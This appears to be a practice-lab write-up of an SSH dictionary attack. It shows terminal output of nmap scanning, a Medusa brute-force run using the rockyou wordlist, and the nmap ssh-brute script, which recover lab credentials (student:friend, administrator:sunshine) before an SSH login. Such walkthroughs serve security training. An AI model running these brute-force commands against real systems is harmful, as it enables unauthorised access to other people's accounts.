The Lab Says to use Hydra but Hydra has been bugged for the last while so I have deiced to use Medusa instead.

root@attackdefense:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
32: eth0@if33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:0a:01:01:04 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.1.4/24 brd 10.1.1.255 scope global eth0
       valid_lft forever preferred_lft forever
35: eth1@if36: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:31:97:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.49.151.2/24 brd 192.49.151.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~# ping 192.49.151.3
PING 192.49.151.3 (192.49.151.3) 56(84) bytes of data.
64 bytes from 192.49.151.3: icmp_seq=1 ttl=64 time=0.091 ms
64 bytes from 192.49.151.3: icmp_seq=2 ttl=64 time=0.069 ms
64 bytes from 192.49.151.3: icmp_seq=3 ttl=64 time=0.089 ms
^C
--- 192.49.151.3 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 29ms
rtt min/avg/max/mdev = 0.069/0.083/0.091/0.009 ms
root@attackdefense:~# nmap -sV 192.49.151.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-07 14:12 UTC
Nmap scan report for l4e7r4qq31o0onp6k7z2yqtqx.temp-network_a-49-151 (192.49.151.3)
Host is up (0.000010s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:31:97:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
root@attackdefense:~# cd /usr/share/wordlists/
root@attackdefense:/usr/share/wordlists# gunzip rockyou.txt.gz
root@attackdefense:/usr/share/wordlists# medusa
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ALERT: Host information must be supplied.

Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
  -h [TEXT]    : Target hostname or IP address
  -H [FILE]    : File containing target hostnames or IP addresses
  -u [TEXT]    : Username to test
  -U [FILE]    : File containing usernames to test
  -p [TEXT]    : Password to test
  -P [FILE]    : File containing passwords to test
  -C [FILE]    : File containing combo entries. See README for more information.
  -O [FILE]    : File to append log information to
  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)
  -M [TEXT]    : Name of the module to execute (without the .mod extension)
  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple times with a
                 different parameter each time and they will all be sent to the module (i.e.
                 -m Param1 -m Param2, etc.)
  -d           : Dump all known modules
  -n [NUM]     : Use for non-default TCP port number
  -s           : Enable SSL
  -g [NUM]     : Give up after trying to connect for NUM seconds (default 3)
  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)
  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.
  -c [NUM]     : Time to wait in usec to verify socket is available (default 500 usec).
  -t [NUM]     : Total number of logins to be tested concurrently
  -T [NUM]     : Total number of hosts to be tested concurrently
  -L           : Parallelize logins using one username per thread. The default is to process
                 the entire username before proceeding.
  -f           : Stop scanning host after first valid username/password found.
  -F           : Stop audit after first valid username/password found on any host.
  -b           : Suppress startup banner
  -q           : Display module's usage information
  -v [NUM]     : Verbose level [0 - 6 (more)]
  -w [NUM]     : Error debug level [0 - 10 (more)]
  -V           : Display version
  -Z [TEXT]    : Resume scan based on map of previous scan


root@attackdefense:/usr/share/wordlists#
root@attackdefense:/usr/share/wordlists# medusa -h 192.49.151.3 -u student -P rockyou.txt -M ssh
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: 123456 (1 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: 12345 (2 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: 123456789 (3 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: password (4 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: iloveyou (5 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: princess (6 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: 1234567 (7 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: rockyou (8 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: 12345678 (9 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: abc123 (10 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: nicole (11 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: daniel (12 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: babygirl (13 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: monkey (14 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: lovely (15 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: jessica (16 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: 654321 (17 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: michael (18 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: ashley (19 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: qwerty (20 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: veronica (239 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: chris (240 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: 888888 (241 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: adriana (242 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: cutie (243 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: james (244 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: banana (245 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: prince (246 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.49.151.3 (1 of 1, 0 complete) User: student (1 of 1, 0 complete) Password: friend (247 of 14344391 complete)
ACCOUNT FOUND: [ssh] Host: 192.49.151.3 User: student Password: friend [SUCCESS]

root@attackdefense:/# nmap --script ssh-brute --script-args user=administrator passdb=/usr/share/wordlists/metasploit/root_userpass.txt -p22  192.49.151.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-07 14:27 UTC
Unable to split netmask from target expression: "passdb=/usr/share/wordlists/metasploit/root_userpass.txt"
NSE: [ssh-brute] Trying username/password pair: root:root
NSE: [ssh-brute] Trying username/password pair: admin:admin
NSE: [ssh-brute] Trying username/password pair: administrator:administrator
NSE: [ssh-brute] Trying username/password pair: user:asshole
NSE: [ssh-brute] Trying username/password pair: web:asshole
NSE: [ssh-brute] Trying username/password pair: test:asshole
NSE: [ssh-brute] Trying username/password pair: root:december
NSE: [ssh-brute] Trying username/password pair: admin:december
NSE: [ssh-brute] Trying username/password pair: webadmin:december
NSE: [ssh-brute] Trying username/password pair: sysadmin:december
NSE: [ssh-brute] Trying username/password pair: netadmin:december
NSE: [ssh-brute] Trying username/password pair: guest:december
NSE: [ssh-brute] Trying username/password pair: user:december
Nmap scan report for l4e7r4qq31o0onp6k7z2yqtqx.temp-network_a-49-151 (192.49.151.3)
Host is up (0.000056s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute:
|   Accounts:
|     administrator:sunshine - Valid credentials
|_  Statistics: Performed 1834 guesses in 602 seconds, average tps: 3.1
MAC Address: 02:42:C0:31:97:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 601.99 seconds
root@attackdefense:/# ^C
root@attackdefense:/#
root@attackdefense:/# ssh administrator@192.49.151.3
Ubuntu 16.04.5 LTS
administrator@192.49.151.3's password:
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

SSH recon dictionary attack lab

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

administrator@victim-1:~$
